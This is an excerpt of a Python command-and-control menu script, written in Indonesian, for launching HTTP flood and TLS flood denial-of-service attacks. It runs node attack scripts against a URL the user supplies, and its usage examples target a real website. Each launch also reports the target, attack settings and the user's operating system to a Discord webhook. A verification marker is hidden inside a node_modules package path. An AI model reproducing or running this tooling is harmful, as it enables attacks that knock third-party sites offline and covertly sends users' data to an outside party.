...
def menu(): 
     ...
     print(""" 
                 ...
                 \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝ 
      \x1b[38;2;0;212;14m* pesan <nama> <pesan> | jika anda ingin melaporkan bug / meminta bantuan
 """)
...
# SPECIAL METHODS
            ...
            try:
                ...
                print('Example: stress https://example.com 443 3 1250 60 5')
                
        elif "pesan" in cnc:
            try:
                nama = cnc.split()[1]
                besar = nama.upper()
                pesan = ' '.join(cnc.split()[2:]) if len(cnc.split()) > 2 else ''
                send_discord_webhook(webhook_url, f"\n\n---------------\nDARI {besar}\n---------------\n   PESAN   \n\n{pesan}\n---------------\n‎ \n‎ \n‎ ")
                print(f'pesan berhasil terkirim dari: \n{nama}\nisi pesan: {pesan}')
            except IndexError:
                print('Example: pesan <nama_kamu> <isi_pesan>')
...
# LAYER 7 METHODS
            ...
            try:
                ...
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nFLOOD\n---------------\nTarget: {url}\nThread: {thread}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node flood.js {url} {time} {thread}')
            except IndexError:
                print('Usage: flood <url> <time> <thread>')
                print('Example: flood https://xnxx.com 80 600')
            ...
            try:
                ...
                device_name = platform.system()
                send_discord_webhook(webhook_url, f"\n\n---------------\nTLS VIP\n---------------\nTarget: {url}\nThread: {thread}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
                os.system(f'node tlspro.js {url} {time} {thread}')
            except IndexError:
                print('Usage: tlvip <url> <time> <thread>')
                print('Example: tlvip https://xnxx.com 60 600')
...
def verify():
    try:
        with open("node_modules/sshpk/lib/formats/verify", "w") as file:
            file.write("Selamat verifikasi telah berhasil.")
        print("\x1b[38;2;0;212;14mVerifikasi berhasil. Anda sekarang dapat masuk.")
    except IOError:
        print("Verifikasi gagal. Tidak dapat membuat file verify.")
...
def install():
 ...
 |_____|_| |_|___/\__\__,_|_|_|_|_| |_|\__, |
    ...
    os.system('npm i http http2 crypto tls')
    os.system('pip3 install -r requirements.txt')
    os.system('wget https://github.com/MHProDev/PyRoxy.git')
...
def is_verified():
    return os.path.isfile("node_modules/sshpk/lib/formats/verify")
	
def delete():
    try:
        os.remove("node_modules/sshpk/lib/formats/verify")
        print("File verify berhasil dihapus.")
    except FileNotFoundError:
        print("File verify tidak ditemukan.")

if len(sys.argv) == 1:
    if is_verified():
        main() 
    else:
        print("anda belum melakukan verifikasi\nsilahkan ketik python3 fzdc2.py install")
elif len(sys.argv) == 2 and sys.argv[1] == "verify":
    if is_verified():
        print("Anda sudah terverifikasi sebelumnya.")
    else:
        verify()
elif len(sys.argv) == 2 and sys.argv[1] == "remove" or sys.argv[1] == "delete":
    if not is_verified():
        print("And belum membuat verify sebelum nya.")
    else:
        delete()
elif len(sys.argv) == 2 and sys.argv[1] == "install":
    if is_verified():
        print("Anda sudah install sebelumnya.")
    else:
        install()
else:
